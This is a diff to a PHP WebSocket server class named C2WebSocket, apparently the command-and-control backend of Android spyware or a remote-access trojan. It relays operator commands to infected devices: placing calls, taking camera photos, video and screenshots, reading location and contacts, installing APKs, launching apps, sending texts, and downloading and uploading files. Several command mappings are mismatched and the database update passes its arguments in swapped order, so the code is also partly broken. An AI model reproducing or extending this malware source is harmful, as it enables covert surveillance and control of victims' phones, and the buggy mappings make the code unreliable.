@@ -10,6 +10,8 @@ class C2WebSocket implements MessageComponentInterface {
 
     protected $clients;
 
+    private ConnectionInterface $server;
+
     /** @var Database $database Database instance */
     private Database $database;
 
@@ -22,6 +24,8 @@ class C2WebSocket implements MessageComponentInterface {
     public function onOpen(ConnectionInterface $conn)
     {
         $this->clients->attach($conn);
+        if (isset($this->server))
+            $this->server->send(time() . " Connection estbalished by " . $conn->resourceId);
     }
 
     public function onMessage(ConnectionInterface $conn, MessageInterface $msg)
@@ -32,15 +36,21 @@ class C2WebSocket implements MessageComponentInterface {
         if ($data['type'] === 'client')
             $this->clientConnection($conn, $data);
         
-
         if ($data['type'] === 'server')
             $this->serverConnection($conn, $data);
+
+        if ($data === "js server")
+            $this->server = $conn;
+
+        if (isset($this->server))
+            $this->server->send(time() . " " . $data);
     }
 
     public function onClose(ConnectionInterface $conn)
     {
-        var_dump($conn);
         $this->clients->detach($conn);
+        if (isset($this->server))
+            $this->server->send(time() . " Connection closed by " . $conn->resourceId);
     }
 
     public function onError(ConnectionInterface $conn, \Exception $e)
@@ -57,6 +67,7 @@ class C2WebSocket implements MessageComponentInterface {
     private function clientConnection(ConnectionInterface $conn, array $data): void
     {
         $clientID = $data['id'];
+        $this->updateClientWebSocketIDinDatabase($clientID, $conn->resourceId); //???????
 
         switch ($data['res']) {
             case "contact":
@@ -124,9 +135,100 @@ class C2WebSocket implements MessageComponentInterface {
     private function serverConnection(ConnectionInterface $conn, array $data): void
     {
         $clientWebSocketID = $data['web_socket_id'];
+        $client = $this->getClient($clientWebSocketID);
+        
+        if (is_null($client))
+            return;
+
+        $json = null;
 
         if ($this->isClientConnected($clientWebSocketID)) {
-
+            switch ($data['cmd']) {
+                case "CALL":
+                    $json = json_encode([
+                        "cmd" => "CALL",
+                        "number" => $data['number'],
+                    ]);
+                    break;
+                case "CAMERA_BACK":
+                    $json = json_encode(["cmd" => "CAMERA_BACK"]);
+                    break;
+                case "CAMERA_FRONT":
+                    $json = json_encode(["cmd" => "CAMERA_FRONT"]);
+                    break;
+                case "DELETE_CONTACT":
+                    $json = json_encode([
+                        "cmd" => "DOWNLOAD_FILE",
+                        "name" => $data['name'],
+                        "number" => $data['number']
+                    ]);
+                    break;
+                case "DOWNLOAD_FILE":
+                    $json = json_encode([
+                        "cmd" => "DOWNLOAD_FILE",
+                        "url" => $data['url'],
+                        "filename" => $data['filename']
+                    ]);
+                    break;
+                case "INSTALL_APK":
+                    $json = json_encode([
+                        "cmd" => "INSTALL_APK",
+                        "path" => $data['path']
+                    ]);
+                    break;
+                case "LAUNCH_APP":
+                    $json = json_encode([
+                        "cmd" => "LAUNCH_APP",
+                        "package" => $data['package']
+                    ]);
+                    break;
+                case "LIST_INSTALLED_APPS":
+                    $json = json_encode(["cmd" => "LIST_INSTALLED_APPS"]);
+                    break;
+                case "LIST_FILES":
+                    $json = json_encode([
+                        "cmd" => "VIDEO",
+                        "path" => $data['path']
+                    ]);
+                    break;
+                case "LOCATION":
+                    $json = json_encode(["cmd" => "LOCATION"]);
+                    break;
+                case "READ_CONTACTS":
+                    $json = json_encode(["cmd" => "READ_CONTACTS"]);
+                    break;
+                case "SCREENSHOT":
+                    $json = json_encode(["cmd" => "SCREENSHOT"]);
+                    break;
+                case "TEXT":
+                    $json = json_encode([
+                        "cmd" => "WRITE_CONTACT",
+                        "number" => $data['number'],
+                        "message" => $data['message']
+                    ]);
+                    break;
+                case "UPLOAD_FILE":
+                    $json = json_encode([
+                        "cmd" => "WRITE_CONTACT",
+                        "path" => $data['path'],
+                        "url" => $data['url']
+                    ]);
+                    break;
+                case "VIDEO":
+                    $json = json_encode(["cmd" => "VIDEO"]);
+                    break;
+                case "WRITE_CONTACT":
+                    $json = json_encode([
+                        "cmd" => "WRITE_CONTACT",
+                        "name" => $data['name'],
+                        "number" => $data['number']
+                    ]);
+                    break;
+                default;
+                    break;
+            }
+            
+            $client->send($json);
         }
     }
 
@@ -147,8 +249,30 @@ class C2WebSocket implements MessageComponentInterface {
         return false;
     }
 
-    private function updateClientWebSocketIDinDatabase(): void
+    /**
+     * Get a client
+     * 
+     * @param int $webSocketConnectionID
+     */
+    private function getClient(int $webSocketConnectionID)
     {
-        
+        foreach ($this->clients as $client) {
+            if ($client->getId() === $webSocketConnectionID)
+                return $client;
+        }
+
+        return null;
+    }
+
+    /**
+     * Update client web socket ID in database
+     * 
+     * @param int $clientID
+     * @param int $webSocketID
+     */
+    private function updateClientWebSocketIDinDatabase(int $clientID, int $webSocketID): void
+    {
+        $query = "UPDATE CLIENT SET web_socket_id=? WHERE id=?";
+        $this->database->update($query, [$clientID, $webSocketID]);
     }
 }
